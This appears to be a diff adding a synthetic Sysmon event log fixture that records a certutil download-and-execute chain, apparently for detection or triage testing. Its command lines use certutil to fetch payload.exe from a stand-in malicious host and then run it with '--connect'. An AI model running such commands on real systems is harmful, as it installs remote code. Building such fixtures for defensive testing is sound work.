@@ -1,0 +1,92 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-TRIAGE</Computer>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <EventRecordID>6001</EventRecordID>
+      <TimeCreated SystemTime="2026-10-25T17:00:00.0000000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-10-25 17:00:00.000</Data>
+      <Data Name="ProcessGuid">{D0000000-0000-0000-0000-000000000001}</Data>
+      <Data Name="ProcessId">10020</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">cmd.exe /c certutil -urlcache -split -f http://malicious.cdn/payload.exe payload.exe</Data>
+      <Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-TRIAGE</Computer>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <EventRecordID>6002</EventRecordID>
+      <TimeCreated SystemTime="2026-10-25T17:00:01.0000000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-10-25 17:00:01.000</Data>
+      <Data Name="ProcessGuid">{D1000000-0000-0000-0000-000000000002}</Data>
+      <Data Name="ProcessId">10024</Data>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="CommandLine">certutil -urlcache -split -f http://malicious.cdn/payload.exe payload.exe</Data>
+      <Data Name="ParentProcessGuid">{D0000000-0000-0000-0000-000000000001}</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>3</EventID>
+      <Computer>DESKTOP-TRIAGE</Computer>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <EventRecordID>6003</EventRecordID>
+      <TimeCreated SystemTime="2026-10-25T17:00:02.5000000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-10-25 17:00:02.500</Data>
+      <Data Name="ProcessGuid">{D1000000-0000-0000-0000-000000000002}</Data>
+      <Data Name="ProcessId">10024</Data>
+      <Data Name="DestinationIp">192.0.2.144</Data>
+      <Data Name="DestinationPort">80</Data>
+      <Data Name="Protocol">tcp</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>11</EventID>
+      <Computer>DESKTOP-TRIAGE</Computer>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <EventRecordID>6004</EventRecordID>
+      <TimeCreated SystemTime="2026-10-25T17:00:03.0000000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-10-25 17:00:03.000</Data>
+      <Data Name="ProcessGuid">{D1000000-0000-0000-0000-000000000002}</Data>
+      <Data Name="TargetFilename">C:\Users\victim\AppData\Local\Temp\payload.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>1</EventID>
+      <Computer>DESKTOP-TRIAGE</Computer>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <EventRecordID>6005</EventRecordID>
+      <TimeCreated SystemTime="2026-10-25T17:00:04.0000000Z" />
+    </System>
+    <EventData>
+      <Data Name="UtcTime">2026-10-25 17:00:04.000</Data>
+      <Data Name="ProcessGuid">{D2000000-0000-0000-0000-000000000003}</Data>
+      <Data Name="ProcessId">10030</Data>
+      <Data Name="Image">C:\Users\victim\AppData\Local\Temp\payload.exe</Data>
+      <Data Name="CommandLine">payload.exe --connect</Data>
+      <Data Name="ParentProcessGuid">{D0000000-0000-0000-0000-000000000001}</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+</Events>
